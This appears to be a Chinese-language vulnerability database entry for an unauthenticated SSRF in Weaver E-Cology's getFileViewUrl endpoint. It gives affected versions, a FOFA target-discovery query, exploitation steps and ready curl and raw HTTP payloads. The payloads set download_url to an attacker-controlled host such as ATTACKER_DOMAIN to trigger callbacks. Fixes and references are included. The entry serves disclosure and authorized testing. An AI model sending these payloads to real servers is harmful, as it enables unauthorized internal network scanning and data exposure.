---
id: WEAVER-ECOLOGY-GETFILEVIEWURL-SSRF
title: 泛微 E-Cology getFileViewUrl 接口 SSRF 漏洞
product: weaver-oa
vendor: 泛微网络
version_affected: "E-Cology 8.0 - 9.0（官方通告），修复版本 10.63 及以上安全补丁包"
severity: MEDIUM
tags: [ssrf, 未授权访问, 信息泄露, 国产, ecology]
fingerprint: ["泛微", "weaver", "E-Cology", "ecology", "getFileViewUrl"]
---

## 漏洞描述

泛微 E-Cology 的 `getFileViewUrl` 接口存在服务端请求伪造（SSRF）漏洞。泛微官方安全通告（2024-06）确认该漏洞影响 ecology 8.0-9.0，修复方法为升级安全补丁包至 10.63 及以上版本；中央网信办与多所高校曾发布风险提示，指出该漏洞 PoC 已公开，未经身份验证的远程攻击者可利用该接口扫描内网/本地端口、获取服务 banner 与内部敏感配置。

**注意**：本条目只覆盖 E-Cology getFileViewUrl SSRF；eteams 越权、E-cology10 QVD-2026-14149 等漏洞各自独立编号，不要合并。

## 影响版本

- 泛微 E-Cology 8.0 - 9.0（官方通告）
- 修复版本：升级安全补丁包至 10.63 及以上

## 前置条件

- 目标为暴露在外的泛微 E-Cology
- 官方通告确认未经身份验证即可利用

## 利用步骤

1. 识别目标为泛微 E-Cology（登录页特征；资产测绘 FOFA: app="泛微-OA（e-cology）"）
2. 未认证向 `/api/doc/mobile/fileview/getFileViewUrl` 发送 JSON POST 请求
3. 在 `download_url` 字段填入你控制的监听地址（公开 PoC 使用 DNSLog 外带）
4. 若监听地址收到来自目标服务器的请求，则存在 SSRF

## Payload

```bash
curl -s -X POST "http://target/api/doc/mobile/fileview/getFileViewUrl" \
  -H "Content-Type: application/json" \
  -d '{"file_id":"1000","file_name":"c","download_url":"http://<你控制的监听地址>/ssrf"}'
```

公开来源原始请求：

```http
POST /api/doc/mobile/fileview/getFileViewUrl HTTP/1.1
Host: your-ip
Content-Type: application/json

{"file_id":"1000","file_name":"c","download_url":"http://ATTACKER_DOMAIN"}
```

## 验证方法

```bash
# 仅限授权测试：向 download_url 填入自己控制的监听地址，观察是否产生外连/内网请求
curl -s -X POST "http://target/api/doc/mobile/fileview/getFileViewUrl" \
  -H "Content-Type: application/json" \
  -d '{"file_id":"1000","file_name":"c","download_url":"http://<你控制的监听地址>/x"}'
# 若监听地址收到来自目标服务器的请求，则存在 SSRF
```

## 指纹确认

```bash
curl -s "http://target/" | grep -iE "weaver|ecology|泛微"
```

## 修复建议

1. 升级至官方修复版本（安全补丁包 10.63 及以上）
2. 若无法立即升级，在 WAF/网关上拦截对 getFileViewUrl 的可疑请求
3. 限制 E-Cology 服务器的出网访问

## 参考

- 泛微安全更新提醒: https://www.weaver.com.cn/cs/security/edm20240607_kdielfrovkewpiiuyrtewtw.html
- 上海科技大学风险提示: https://it.shanghaitech.edu.cn/2024/0722/c8406a1099322/page.htm
- 公开 PoC（某微E-Cology getFileViewUrl SSRF 漏洞复现）: https://mp.weixin.qq.com/s/j7t2jgwUfEYHKYoj7tOPCA
- 斗象应急响应团队通告: https://vip.tophant.com/detail/1811329332556206080
- 腾讯云开发者（UzzzzZ 文章）: https://cloud.tencent.com.cn/developer/article/2435717
